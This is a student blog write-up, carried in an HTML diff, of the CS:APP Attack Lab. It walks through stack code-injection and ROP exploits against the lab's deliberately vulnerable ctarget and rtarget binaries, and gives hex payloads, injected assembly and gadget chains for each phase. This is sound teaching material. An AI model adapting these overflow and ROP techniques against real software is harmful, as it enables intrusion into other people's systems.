@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="The attack lab is a good way to start the CTF PWN. It contains the basic attack ways stack execution and ROP.If you have not been into PWN world, this lab will lead you to a new world.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack Lab">
+<meta property="og:url" content="http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="The attack lab is a good way to start the CTF PWN. It contains the basic attack ways stack execution and ROP.If you have not been into PWN world, this lab will lead you to a new world.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjM-OmY3msmtpw4fBVZ5yp6oBlYB.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjNilpVsLFVy0_B-8ik8S-7WkmgY.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlVmRlPd-D_cF-VOvrC88P_c57Ka.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuZbt5GmgdilLTg1M5vIlBgbqUIV.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu5v-csfgHVVmo1FcxK_gt7iQleS.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Flhs6mONByej1KrqNv5b-lmedgCX.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqsgROB9RzVyenkOmeAmyM8MDelP.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpoWxPGe_s3V5aQO7rNDtLT4nsPp.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtDnUVRTNym-sGXOM1u6Ioo1H9fv.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn-hr4K25eYnJ_jk8ZGU7ZsZStLw.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv53U3SujluS8DlLZDfXjjVsGg5Y.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqcmcuyulktD3A8Z4BDkdvrqP_rE.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgrDT1_GFSI94IVFvuqekp0SGOJM.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frn6w8Lp-T2_Ar5KMBUgWJaZMKDz.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv_wftj16FBAJoWXoaUzYwlQdW2K.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrvobFqIXU-XyX6cznou5omOj0bk.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtZNBRsHBPTxzzE-ljta7j25017f.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqqTMfZsI3jElsTZJw-7IQQjUVvq.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsFAGsDenSWR2-o-dDE_sJDfgLCl.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuN4rakyoByhp48TguwCpYs3Vx23.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoxzbSDKVAyhHe6a9hbprrqv90u6.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjWy3NiNyyqN69ioTINPOrRlTnW7.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvejOrtUVSMwu0ahCNuj0yf8TH1k.png">
+<meta property="article:published_time" content="2023-03-01T14:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:12.690Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="CSAPP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjM-OmY3msmtpw4fBVZ5yp6oBlYB.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Attack Lab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/%5BFuzzing%20Lab%5D%20Exercise%201%20-%20Xpdf.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/%5BCSAPP-Lab%5D%20Cache%20Lab.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&text=Attack Lab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&is_video=false&description=Attack Lab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Attack Lab&body=Check out this article: http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&name=Attack Lab&description=&lt;p&gt;The attack lab is a good way to start the CTF PWN. It contains the basic attack ways stack execution and ROP.&lt;br&gt;If you have not been into PWN world, this lab will lead you to a new world.&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&t=Attack Lab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Execution-Description"><span class="toc-number">1.</span> <span class="toc-text">Stack Execution Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-Description"><span class="toc-number">2.</span> <span class="toc-text">ROP Description</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stack-Execution-Ctarget"><span class="toc-number"></span> <span class="toc-text">Stack Execution Ctarget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-conduct-the-attack"><span class="toc-number">1.</span> <span class="toc-text">How to conduct the attack?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Touch1"><span class="toc-number">2.</span> <span class="toc-text">Touch1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Touch2"><span class="toc-number">3.</span> <span class="toc-text">Touch2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Touch3"><span class="toc-number">4.</span> <span class="toc-text">Touch3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP-rtarget"><span class="toc-number"></span> <span class="toc-text">ROP rtarget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#phase4"><span class="toc-number">1.</span> <span class="toc-text">phase4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Last-phase"><span class="toc-number">2.</span> <span class="toc-text">Last phase</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Attack Lab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-01T14:18:00.000Z" class="dt-published" itemprop="datePublished">2023-03-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CSAPP/">CSAPP</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CSAPP/" rel="tag">CSAPP</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>The attack lab is a good way to start the CTF PWN. It contains the basic attack ways stack execution and ROP.<br>If you have not been into PWN world, this lab will lead you to a new world.</p>
+<span id="more"></span>
+
+<p>Frist of all, you have to know what is the stack in computer, which address is high to low.</p>
+<h2 id="Stack-Execution-Description"><a href="#Stack-Execution-Description" class="headerlink" title="Stack Execution Description"></a>Stack Execution Description</h2><p>If we know the stack is executable, we can modify the return address to the stack again. And the program will run the the code of stack automatically which means we can input the malicious code to control the victim computer or conduct DDOS attack.</p>
+<h2 id="ROP-Description"><a href="#ROP-Description" class="headerlink" title="ROP Description"></a>ROP Description</h2><p>When the stack is inexecutable, we can use the ROP. ROP can use the gadgets of program to form the malicious code to conduct the attack. Ret2text, ret2shellcode, ret2syscall, ret2lib are the common ways to control the program stack.</p>
+<h1 id="Stack-Execution-Ctarget"><a href="#Stack-Execution-Ctarget" class="headerlink" title="Stack Execution Ctarget"></a>Stack Execution Ctarget</h1><p>In order to improve the difficulty of the whole lab, we don’t plan to look at the source code, but analyze the flow of the whole program and attack it through assembly code.<br>In the ctarget, it should attach the <code>touch</code> function through the stack execution which can modify by ourself.</p>
+<h2 id="How-to-conduct-the-attack"><a href="#How-to-conduct-the-attack" class="headerlink" title="How to conduct the attack?"></a>How to conduct the attack?</h2><ol>
+<li>We should know the size of stack, which can help us to cover the return address correctly.</li>
+<li>Learn simple asm coding.</li>
+</ol>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjM-OmY3msmtpw4fBVZ5yp6oBlYB.png"><br>touch1, touch2, touch3 are the phase we need to solve in this program <strong>ctarget</strong>.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjNilpVsLFVy0_B-8ik8S-7WkmgY.png"><br>The ctarget will expand the size 0x28 bytes of stack. We can input the string in the stack.</p>
+<h2 id="Touch1"><a href="#Touch1" class="headerlink" title="Touch1"></a>Touch1</h2><p>We can attach the touch1 with no args, so that we can input any characters in 40 sizes, only focus the last return address is c0 17 40.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlVmRlPd-D_cF-VOvrC88P_c57Ka.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 c0 17 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuZbt5GmgdilLTg1M5vIlBgbqUIV.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu5v-csfgHVVmo1FcxK_gt7iQleS.png"></p>
+<p>The second way is</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">pushq $0x4017c0
+ret
+
+----- ASM CODE -------
+gcc -c &lt;asm file>
+
+objdump -d &lt;executable binary>
+
+We can get the source code in heximal types.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Flhs6mONByej1KrqNv5b-lmedgCX.png"></p>
+<p>To get the rsp address.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqsgROB9RzVyenkOmeAmyM8MDelP.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">malicious asm coding
+------------------------
+68 c0 17 40 00 c3 30 30 # to jmp to the touch1
+30 30 30 30 30 30 30 30 # padding
+30 30 30 30 30 30 30 30
+30 30 30 30 30 30 30 30
+30 30 30 30 30 30 30 30
+78 dc 61 55 00 00 00 00 # cover the return address<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpoWxPGe_s3V5aQO7rNDtLT4nsPp.png"></p>
+<h2 id="Touch2"><a href="#Touch2" class="headerlink" title="Touch2"></a>Touch2</h2><p>We need the something in rdi, and it will compare with the [rip+0x202ce2]. And rip+0x202ce2 is our cookie.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtDnUVRTNym-sGXOM1u6Ioo1H9fv.png"></p>
+<p>We move our cookie to rdi, and jmp to the 0x4017ec, the cookie value will store in rdi. So it will satisfy the if-statement.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn-hr4K25eYnJ_jk8ZGU7ZsZStLw.png"></p>
+<p>The return address still will be covered by ourself. I replace the original address with address of stack.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv53U3SujluS8DlLZDfXjjVsGg5Y.png"></p>
+<p>Finished this part.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqcmcuyulktD3A8Z4BDkdvrqP_rE.png"></p>
+<h2 id="Touch3"><a href="#Touch3" class="headerlink" title="Touch3"></a>Touch3</h2><p>In touch1 and touch2, we know the init rsp is 0x5561dc78. In this phase, we need to calculate the new stack address, when we fill 40 bytes stack, we need to know the new rsp address, so we can plus 48(including the cover address) with original address to get new one.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgrDT1_GFSI94IVFvuqekp0SGOJM.png"></p>
+<p>In gdb vmmap, we know the 0x55586000-0x5568600 is readable, writeable, executable.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frn6w8Lp-T2_Ar5KMBUgWJaZMKDz.png"></p>
+<p>The rdi is our stack adress + 48, after hexmatch, it will run to &lt;touch3+67&gt;<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv_wftj16FBAJoWXoaUzYwlQdW2K.png"></p>
+<p>Asm code</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">movq    $0x5561dca8, <span class="token comment">%rdi</span>
+<span class="token comment">% # why need to move to 0x5561dca8?</span>
+<span class="token comment">% # Because the cookie store at orginal stackaddress + 48(48 = 40 + 8)</span>
+<span class="token comment">% # 40 is code + padding, 8 is cover address</span>
+<span class="token comment">% # If we enter other address, we can't get the cookie in touch3, so it will failed.</span>
+pushq   0x4018fa
+ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The hexcode.</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">48 c7 c7 a8 dc 61 55 68
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+------------------------- mov stack address to rdi + padding
+78 dc 61 55 00 00 00 00
+------------------------- cover the address
+35 39 62 39 39 37 66 61
+00
+------------------------- cookie in ascii style<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Ctarget part have been finished :-)<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrvobFqIXU-XyX6cznou5omOj0bk.png"></p>
+<h1 id="ROP-rtarget"><a href="#ROP-rtarget" class="headerlink" title="ROP rtarget"></a>ROP rtarget</h1><h2 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h2><p>rtarget is almost same as the ctarget, it add some check function in the program to check our stack.<br>I will use 2 ways to exploit the rtarget touch2.</p>
+<p>We know the stack is inexecutable, we only can grab the gadgets from program itself which means use its asm code to exploit itself through malicious spliced code.</p>
+<p>In the touch2, we know we need to pass the args of cookie. And the cookie must be in rdi, so here is two way to implement it.</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">padding
+pop rax
+cookie
+mov rdi, rax
+address of touch2
+------------------
+
+padding
+ret
+pop rdi
+cookie
+address of touch2
+
+
+31 31 31 31 31 31 31 31
+31 31 31 31 31 31 31 31
+31 31 31 31 31 31 31 31
+31 31 31 31 31 31 31 31
+31 31 31 31 31 31 31 31 ; padding
+55 0c 40 00 00 00 00 00 ; ret
+1b 14 40 00 00 00 00 00 ; pop rdi
+fa 97 b9 59 00 00 00 00 ; cookie
+ec 17 40 00 00 00 00 00 ; address of touch2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Why we need to add statement of ret in second way. Because of the stack balance, we need to ensure the rsp is a multiple of 8 or 16, that is a reason why we need to use ret statment before we pop rdi. In the first way, the ret statement will follow the pop rax automatically. So we don’t need to be worry about the stack balance.</p>
+<p>How to find the gadgets?<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtZNBRsHBPTxzzE-ljta7j25017f.png"></p>
+<p>We usually use the ROPgadget tool to find gadget in the program.</p>
+<p>The first way<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqqTMfZsI3jElsTZJw-7IQQjUVvq.png"></p>
+<p>The second way</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsFAGsDenSWR2-o-dDE_sJDfgLCl.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuN4rakyoByhp48TguwCpYs3Vx23.png"></p>
+<h2 id="Last-phase"><a href="#Last-phase" class="headerlink" title="Last phase"></a>Last phase</h2><p>The last phase point is how to move the rsp address to the rdi.<br>The way is moving value of rsp to rax, and then moving value of rax to rdi. rdi plus offset point to the hexadecimal of cookie.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoxzbSDKVAyhHe6a9hbprrqv90u6.png"></p>
+<p>rdi+rsi &#x3D; rax<br>rdi &#x3D; rax, we can get the final value in rdi ;-)<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjWy3NiNyyqN69ioTINPOrRlTnW7.png"></p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span>
+<span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span>
+<span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span>
+<span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span>
+<span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span>
+<span class="token number">55</span> <span class="token number">0</span>c <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token punctuation">;</span> ret <span class="token comment">// for stack balance</span>
+<span class="token number">06</span> <span class="token number">1</span>a <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token punctuation">;</span> mov rax<span class="token punctuation">,</span>rsp <span class="token punctuation">;</span> <span class="token comment">// when program run here, rsp have been changed rsp+8</span>
+a2 <span class="token number">19</span> <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token punctuation">;</span> mov rdi<span class="token punctuation">,</span>rax <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
+<span class="token number">83</span> <span class="token number">13</span> <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token punctuation">;</span> pop rsi              <span class="token operator">|</span>
+<span class="token number">30</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token punctuation">;</span> rsi <span class="token operator">=</span> <span class="token number">0x30</span>           <span class="token operator">|</span>
+d6 <span class="token number">19</span> <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token punctuation">;</span> rax <span class="token operator">=</span> rdi <span class="token operator">+</span> rsp      <span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span> <span class="token number">6</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">=</span><span class="token number">48</span> <span class="token operator">=</span> <span class="token number">0x30</span> <span class="token operator">=</span> offset
+a2 <span class="token number">19</span> <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token punctuation">;</span> rdi <span class="token operator">=</span> rax            <span class="token operator">|</span>
+fa <span class="token number">18</span> <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token punctuation">;</span> jmp touch3           <span class="token operator">|</span>
+<span class="token number">35</span> <span class="token number">39</span> <span class="token number">62</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">37</span> <span class="token number">66</span> <span class="token number">61</span> <span class="token number">00</span>          <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">|</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Attack lab have been finished in two days.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvejOrtUVSMwu0ahCNuj0yf8TH1k.png"></p>
+<p>In general, this experiment is much better than that of domestic universities. There is a lot of knowledge that we need to learn after class.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Execution-Description"><span class="toc-number">1.</span> <span class="toc-text">Stack Execution Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-Description"><span class="toc-number">2.</span> <span class="toc-text">ROP Description</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stack-Execution-Ctarget"><span class="toc-number"></span> <span class="toc-text">Stack Execution Ctarget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-conduct-the-attack"><span class="toc-number">1.</span> <span class="toc-text">How to conduct the attack?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Touch1"><span class="toc-number">2.</span> <span class="toc-text">Touch1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Touch2"><span class="toc-number">3.</span> <span class="toc-text">Touch2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Touch3"><span class="toc-number">4.</span> <span class="toc-text">Touch3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP-rtarget"><span class="toc-number"></span> <span class="toc-text">ROP rtarget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#phase4"><span class="toc-number">1.</span> <span class="toc-text">phase4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Last-phase"><span class="toc-number">2.</span> <span class="toc-text">Last phase</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
